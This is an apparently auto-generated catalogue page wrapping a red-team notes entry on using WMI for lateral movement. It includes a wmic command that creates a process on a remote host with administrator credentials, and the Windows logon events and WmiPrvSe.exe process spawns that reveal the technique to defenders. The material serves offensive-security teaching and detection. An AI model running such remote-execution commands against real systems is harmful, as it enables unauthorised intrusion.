---
parsed_by: focuslocust
source: redteamingtactics
type: generated
---
# WMI for Lateral Movement

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `redteamingtactics` |
| Type | `redteaming-topic` |
| Record ID | `rtt-offensive-security-lateral-movement-t1047-wmi-for-lateral-movement` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/lateral-movement/t1047-wmi-for-lateral-movement.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [WMI for Lateral Movement](../../topics/offensive-security/wmi-for-lateral-movement.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | rtt-offensive-security-lateral-movement-t1047-wmi-for-lateral-movement |
| name | WMI for Lateral Movement |
| type | redteaming-topic |
| source | redteamingtactics |
| url | https://github.com/mantvydasb/RedTeaming-Tactics-and-Techniques/blob/master/offensive-security/lateral-movement/t1047-wmi-for-lateral-movement.md |

## Preserved Source Material

````yaml
_asset_filenames:
- wmi-logons.png
- wmic-calc.png
- wmic-create-cmdline.png
- wmic-logon.png
- wmic-spawn.png
_body: '---

  description: ''Windows Management Instrumentation for code execution, lateral movement.''

  ---


  # WMI for Lateral Movement


  ## Execution


  Spawning a new process on the target system 10.0.0.6 from another compromised system 10.0.0.2:


  {% code title="attacker@victim" %}

  ```bash

  wmic /node:10.0.0.6 /user:administrator process call create "cmd.exe /c calc"

  ```

  {% endcode %}


  ## Observations


  ![](../../.gitbook/assets/wmic-calc.png)


  Inspecting sysmon and windows audit logs, we can see `4648` logon events being logged on the source machine as well as processes
  being spawned by `WmiPrvSe.exe` on the target host:


  ![](../../.gitbook/assets/wmic-create-cmdline.png)


  ![](../../.gitbook/assets/wmic-logon.png)


  ![](../../.gitbook/assets/wmic-spawn.png)


  Both on the host initiating the connection and on the host that is being logged on to, events `4624` and `4648` should be
  logged:


  ![](../../.gitbook/assets/wmi-logons.png)


  ## References


  {% embed url="https://attack.mitre.org/wiki/Technique/T1047" %}'
_relative_path: offensive-security/lateral-movement/t1047-wmi-for-lateral-movement.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/lateral-movement/t1047-wmi-for-lateral-movement.md
````
